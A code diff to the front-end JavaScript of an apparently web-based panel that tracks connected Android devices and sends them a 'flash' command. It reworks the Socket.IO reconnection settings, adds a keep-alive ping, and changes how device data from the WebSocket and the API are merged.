@@ -1010,6 +1010,9 @@
         let cooldownInterval = null;
         let cooldownEndTime = 0;
         
+        // Keep-alive interval
+        let keepAliveInterval = null;
+        
         // ========== INIT ==========
         (function() {
             // Check auth
@@ -1132,15 +1135,18 @@
             }, 100);
         }
         
-        // ========== WEBSOCKET ==========
+        // ========== WEBSOCKET - FIXED VERSION ==========
         function connectWebSocket() {
             try {
                 socket = io(backendUrl, {
-                    transports: ['websocket', 'polling'],
+                    transports: ['websocket'],
                     reconnection: true,
-                    reconnectionAttempts: 999,
-                    reconnectionDelay: 1000,
-                    timeout: 20000
+                    reconnectionAttempts: 50,
+                    reconnectionDelay: 2000,
+                    reconnectionDelayMax: 10000,
+                    timeout: 30000,
+                    forceNew: true,
+                    autoConnect: true
                 });
                 
                 socket.on('connect', () => {
@@ -1148,6 +1154,9 @@
                     updateConnectionStatus(true);
                     socket.emit('panel-connect', {});
                     showNotification('Connected to server', 'success');
+                    
+                    // Start keep-alive
+                    startKeepAlive();
                 });
                 
                 socket.on('connect_error', (error) => {
@@ -1155,69 +1164,70 @@
                     updateConnectionStatus(false);
                 });
                 
-                socket.on('disconnect', () => {
+                socket.on('disconnect', (reason) => {
+                    console.log('WebSocket disconnected:', reason);
                     updateConnectionStatus(false);
+                    stopKeepAlive();
+                    
+                    // Kalo disconnect karena server, coba reconnect manual
+                    if (reason === 'io server disconnect' || reason === 'transport close') {
+                        setTimeout(() => {
+                            socket.connect();
+                        }, 3000);
+                    }
                 });
                 
-                // Handle device status updates
-socket.on('device-status', (data) => {
-    console.log('📱 Device status:', data);
-    
-    const deviceId = data.deviceId;
-    const isOnline = data.status === 'online';
-    
-    if (deletedDevices.has(deviceId)) {
-        console.log('🚫 Device ignored (deleted):', deviceId);
-        return;
-    }
-    
-    if (!wsDevices.has(deviceId)) {
-        // JANGAN PAKE DATA RANDOM! TUNGGU API KALO GA ADA
-        // Bikin object kosong dulu
-        wsDevices.set(deviceId, {
-            deviceId: deviceId,
-            deviceName: 'Waiting for data...',
-            model: 'Loading...',
-            androidVersion: 'Unknown',
-            batteryLevel: 0,
-            lastSeen: new Date().toISOString(),
-            online: isOnline,
-            fromWS: true
-        });
-    } else {
-        let dev = wsDevices.get(deviceId);
-        dev.online = isOnline;
-        dev.lastSeen = new Date().toISOString();
-        wsDevices.set(deviceId, dev);
-    }
-    
-    mergeAndRenderDevices();
-    updateStats();
-});
-
-// TAMBAHIN LISTENER UNTUK HEARTBEAT (BAWA DATA LENGKAP)
-socket.on('heartbeat', (data) => {
-    console.log('💓 Heartbeat with data:', data);
-    
-    const deviceId = data.deviceId;
-    
-    if (deletedDevices.has(deviceId)) return;
-    
-    // Update dengan data LENGKAP dari heartbeat
-    wsDevices.set(deviceId, {
-        deviceId: deviceId,
-        deviceName: data.deviceName || 'Unknown',
-        model: data.model || 'Unknown',
-        androidVersion: data.androidVersion || 'Unknown',
-        batteryLevel: data.batteryLevel || 0,
-        lastSeen: new Date().toISOString(),
-        online: true,
-        fromWS: true
-    });
-    
-    mergeAndRenderDevices();
-    updateStats();
-});
+                // Handle device status updates - LANGSUNG DENGAN DATA LENGKAP!
+                socket.on('device-status', (data) => {
+                    console.log('📱 Device status:', data);
+                    
+                    const deviceId = data.deviceId;
+                    const isOnline = data.status === 'online';
+                    
+                    if (deletedDevices.has(deviceId)) return;
+                    
+                    // UPDATE LANGSUNG DENGAN DATA DARI SERVER!
+                    wsDevices.set(deviceId, {
+                        deviceId: deviceId,
+                        deviceName: data.deviceName || 'Unknown',
+                        model: data.model || 'Unknown',
+                        androidVersion: data.androidVersion || 'Unknown',
+                        batteryLevel: data.batteryLevel || 0,
+                        lastSeen: new Date().toISOString(),
+                        online: isOnline,
+                        fromWS: true
+                    });
+                    
+                    mergeAndRenderDevices();
+                    updateStats();
+                });
+                
+                // Handle heartbeat
+                socket.on('heartbeat', (data) => {
+                    console.log('💓 Heartbeat:', data);
+                    
+                    const deviceId = data.deviceId;
+                    if (deletedDevices.has(deviceId)) return;
+                    
+                    wsDevices.set(deviceId, {
+                        deviceId: deviceId,
+                        deviceName: data.deviceName || 'Unknown',
+                        model: data.model || 'Unknown',
+                        androidVersion: data.androidVersion || 'Unknown',
+                        batteryLevel: data.batteryLevel || 0,
+                        lastSeen: new Date().toISOString(),
+                        online: true,
+                        fromWS: true
+                    });
+                    
+                    mergeAndRenderDevices();
+                    updateStats();
+                });
+                
+                // Handle pong
+                socket.on('pong', () => {
+                    console.log('🏓 Pong received');
+                });
                 
                 // Handle command results
                 socket.on('command-result', (data) => {
@@ -1237,6 +1247,24 @@ socket.on('heartbeat', (data) => {
             } catch (e) {
                 console.error('WebSocket error:', e);
                 updateConnectionStatus(false);
+            }
+        }
+        
+        // ========== KEEP ALIVE ==========
+        function startKeepAlive() {
+            stopKeepAlive();
+            keepAliveInterval = setInterval(() => {
+                if (socket && socket.connected) {
+                    socket.emit('ping');
+                    console.log('🏓 Ping sent');
+                }
+            }, 15000);
+        }
+        
+        function stopKeepAlive() {
+            if (keepAliveInterval) {
+                clearInterval(keepAliveInterval);
+                keepAliveInterval = null;
             }
         }
         
@@ -1286,11 +1314,18 @@ socket.on('heartbeat', (data) => {
         
         function mergeAndRenderDevices() {
             let allDevices = [];
-            devices.forEach(d => allDevices.push(d));
             
+            // Prioritas: data dari WebSocket (lebih realtime)
             wsDevices.forEach((wsDevice, id) => {
-                if (!deletedDevices.has(id) && !allDevices.find(d => d.deviceId === id)) {
+                if (!deletedDevices.has(id)) {
                     allDevices.push(wsDevice);
+                }
+            });
+            
+            // Tambah dari API yang belum ada di WebSocket
+            devices.forEach(d => {
+                if (!deletedDevices.has(d.deviceId) && !allDevices.find(dev => dev.deviceId === d.deviceId)) {
+                    allDevices.push(d);
                 }
             });
             
@@ -1367,9 +1402,11 @@ socket.on('heartbeat', (data) => {
             const search = document.getElementById('search-input').value.toLowerCase();
             
             let allDevices = [];
-            devices.forEach(d => allDevices.push(d));
             wsDevices.forEach((d, id) => {
-                if (!deletedDevices.has(id) && !allDevices.find(dev => dev.deviceId === id)) {
+                if (!deletedDevices.has(id)) allDevices.push(d);
+            });
+            devices.forEach(d => {
+                if (!deletedDevices.has(d.deviceId) && !allDevices.find(dev => dev.deviceId === d.deviceId)) {
                     allDevices.push(d);
                 }
             });
@@ -1385,9 +1422,11 @@ socket.on('heartbeat', (data) => {
         // ========== STATS ==========
         function updateStats() {
             let allDevices = [];
-            devices.forEach(d => allDevices.push(d));
             wsDevices.forEach((d, id) => {
-                if (!deletedDevices.has(id) && !allDevices.find(dev => dev.deviceId === id)) {
+                if (!deletedDevices.has(id)) allDevices.push(d);
+            });
+            devices.forEach(d => {
+                if (!deletedDevices.has(d.deviceId) && !allDevices.find(dev => dev.deviceId === d.deviceId)) {
                     allDevices.push(d);
                 }
             });
@@ -1431,7 +1470,7 @@ socket.on('heartbeat', (data) => {
             currentDevice = null;
         }
         
-        // ========== FLASH COMMAND DENGAN COOLDOWN ==========
+        // ========== FLASH COMMAND ==========
         async function sendFlashCommand() {
             if (!currentDevice) {
                 showNotification('No device selected', 'error');
@@ -1467,7 +1506,6 @@ socket.on('heartbeat', (data) => {
                 
                 if (data.success) {
                     showNotification(`✅ Flash command sent (${duration}s)`, 'success');
-                    // Mulai cooldown sesuai durasi flash
                     startCooldown(duration);
                 } else {
                     showNotification('❌ Failed to send flash', 'error');
@@ -1503,10 +1541,9 @@ socket.on('heartbeat', (data) => {
                 deletedDevices.add(currentDevice.deviceId);
                 localStorage.setItem('quantumx_deleted_devices', JSON.stringify(Array.from(deletedDevices)));
                 
+                // Hapus dari semua storage
                 const index = devices.findIndex(d => d.deviceId === currentDevice.deviceId);
-                if (index !== -1) {
-                    devices.splice(index, 1);
-                }
+                if (index !== -1) devices.splice(index, 1);
                 
                 if (wsDevices.has(currentDevice.deviceId)) {
                     wsDevices.delete(currentDevice.deviceId);
@@ -1558,6 +1595,8 @@ socket.on('heartbeat', (data) => {
         }
         
         function logout() {
+            stopKeepAlive();
+            if (socket) socket.disconnect();
             localStorage.removeItem('quantumx_token');
             localStorage.removeItem('quantumx_user');
             window.location.href = 'login.html';
